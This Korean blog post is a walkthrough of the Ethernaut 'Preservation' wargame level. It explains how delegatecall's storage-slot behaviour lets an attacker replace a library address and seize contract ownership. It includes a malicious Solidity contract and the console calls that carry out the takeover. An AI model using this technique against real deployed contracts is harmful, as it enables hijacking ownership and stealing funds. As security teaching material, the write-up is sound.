---
emoji: 🧢
title: (Ethernaut 취약점 16) Preservation
date: '2022-01-24 11:14:00'
author: 한성원
tags: ethernaut Preservation vulnerability 
categories: 취약점분석
---


# 👋 1. Preservation
__Difficulty 8/10__

- 승리 조건
- 코드 분석
- 풀이
순서로 진행 될 것이다.

- - -

## 승리 조건
- instance의 ownership을 가져오면 승리한다.

- - -

## 코드 분석
이미 잘 설명되어있어 간단한 분석만 주석에 적었다!

```solidity
contract Preservation {
    
    // public library contracts 
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner; // slot 2
    uint storedTime; // slot 3

    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    // timeZone에 대한 LibraryAddress 등록 및 owner 등록
    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
        timeZone1Library = _timeZone1LibraryAddress; 
        timeZone2Library = _timeZone2LibraryAddress; 
        owner = msg.sender;
    }
    

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {

    // stores a timestamp 
    uint storedTime;  

    function setTime(uint _time) public {
        storedTime = _time;
    }
}
```
- - -

## 풀이
이 문제에서 우리의 목표는 ownership을 가져오는 것이다.

여기서 우리가 꼭 알아야하는 개념은 delegate call이다. 나도 delegate call에 대해서 2번이나 다뤘지만 이 문제를 풀기 전까지 모호했던 것 같다.
이 문제를 완벽하게 이해할 수 있다면 delegate call에 대해서 좀 더 확신을 가질 수 있을 것이다.

### Delegate Call은 무엇인가?
- [Delegate Call 취약점](https://holyhansss.github.io/vulnerability/delegate_call/delegate_call/)
- [Delegation ethernaut 문제 6](https://holyhansss.github.io/ethernaut/6_delegation_ethernaut/6_delegation_ethernaut/)

위 링크에서 delegate call에 대한 개념을 복습해보자! ~~구글에 좋은 자료도 많아요ㅎㅎ~~

Delegate call은 call과 비슷하지만 다른 2가지 특징을 더 가지고 있다.
1. 호출한 contract의 context를 기반으로 동작된다.
2. storage layout은 delegatecall을 이용하는 contract와 같아야한다.

1번과 2번 특징 모두 이번 문제에 중요한 key이다.
1번 특징에 관해서는 위 글에서 확인할 수 있고 2번 특징 같은 경우 [Privacy 문제 ethernaut 12](https://holyhansss.github.io/ethernaut/12_privacy_ethernaut/12_privacy_ethernaut/)에서 확인 할 수 있다.

### 풀이
우리가 delegate call에 대한 지식이 부족하다면, `setFirstTime(uint _timeStamp)`이 timeZone1Library의 `setTime`에 function을 실행시키고 Preservation contract의 `storedTime`을 바꿀 것이라고 생각할 것이다.
하지만 delegate call은 low level이라는 것을 명심하자! 즉 delegate call은 storage 기반이다. LibraryContract의 `storedTime`은 slot 0를 차지한다. 그렇기 때문에 preservation contract에서 delegate call을 통해 setTime을 호출한다면 이는 preservation contract의 `slot 0`를 바꾸는 것이다.


~~어떻게 설명을 더 잘 쓸 수 있을까...ㅠㅠ~~ 

좀 더 간단하게 정리해보자면:
1. delegate call은 slot기반으로 데이터를 바꿀 수 있다.(변수 이름 X)
2. preservation contract에서 delegate call을 통해 LibraryContract.setTime()을 call 한다.
3. setTime은 LibraryContract의 slot 0을 바꾸는 함수이다.
4. 즉 delegate call setTime을 통해 Preservation contract의 slot 0를 바꿀 수 있다. 

그렇다면 우리가 slot 0을 악의적인 contract로 바꾸면 어떻게 될까? 
`setFirstTime(uint _timeStamp)`에 악의적인 contract의 주소를 매개변수로 넣는다면 slot 0에 있는 timeZone1Library가 악의적인 contract로 바뀔 것이고 우리는 delegate call의 특성을 사용해 slot들을 마음대로 바꿀 수 있게된다.

그럼 한번 풀이를 보도록 하자!
우선 공격에 필요한 악의적인 contract를 만든다(on remix).
storage layout이 Perservation과 같아야한다.

```solidity
contract PreservationAttack {
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner; // slot 2
    uint storedTime; // slot 3

    // Perservation에서 setTime으로 delegatecall을 보내기 때문에 이름이 똑같아야한다!
    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
```

attack contract는 완성이 되었다!
그럼 공격의 시나리오를 보자.
1. PreservationAttack를 deploy한다.
2. Preservation.setFirstTime()을 PreservationAttack의 주소와 함께 호출한다.
3. Preservation의 timeZone1Library는 PreservationAttack로 변한다.
4. 한번 더 setFirstTime()을 호출하게되면 LibraryContract가 아닌 PreservationAttack의 setTime을 호출한다.
5. setTime은 storage의 slot 2(owner)를 msg.sender로 바꾼다.
6. DONE!


그럼 attack contract를 deploy한 후 console 창에서는 무엇이 이루어지는지 확인해보자.

모든 코드는 console창에서 이루어진다. 
ctrl + shift + i를 눌러 console창을 활성화 시키자
```javascript
// 기존의 timeZone1Library를 확인한다.
await contract.timeZone1Library()

// attack contract의 주소를 매개변수로하여 setFirstTime을 호출한다.
await contract.setFirstTime("0x6bF70e10D96F41F8AE2C3EDbe017ECEc5242C50D")

// timeZone1Library가 attack contract의 주소로 바뀐 것을 확인할 수 있다.
await contract.timeZone1Library()

// setFirstTime의 delegatecall을 활용하여 attack contract의 setTime을 호출한다. 
// 이때 매개변수는 무엇이 되어도 상관없다.
// 왜냐하면 attack contract의 setTime은 매개 변수를 사용하지 않는다.
await contract.setFirstTime("0123456789")

// owner가 자신이 된 것을 확인할 수 있다.
await contract.owner()
```


완료 후 ethernaut으로 돌아와 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.
```
٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
```
- - -

## 마무리
이번 문제는 [delegation](https://holyhansss.github.io/ethernaut/6_delegation_ethernaut/6_delegation_ethernaut/) 문제때 보다 delegate call에 대해 좀 더 깊이 이해할 수 있었던 기회였던 것 같다. 솔직히 지금까지는 delegate call이 나에게 가장 어려운 컨셉이었다. 앞으로도 배울 것이 많으니 꾸준히 공부해보자 :)!

- - -
## REF
- rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
- ethernaut: https://ethernaut.openzeppelin.com/
- remix IDE: https://remix.ethereum.org
- DelegateCall 취약점 :https://holyhansss.github.io/vulnerability/delegate_call/delegate_call/
- Solidity Docs delegate call: https://docs.soliditylang.org/en/v0.8.10/introduction-to-smart-contracts.html

```toc

```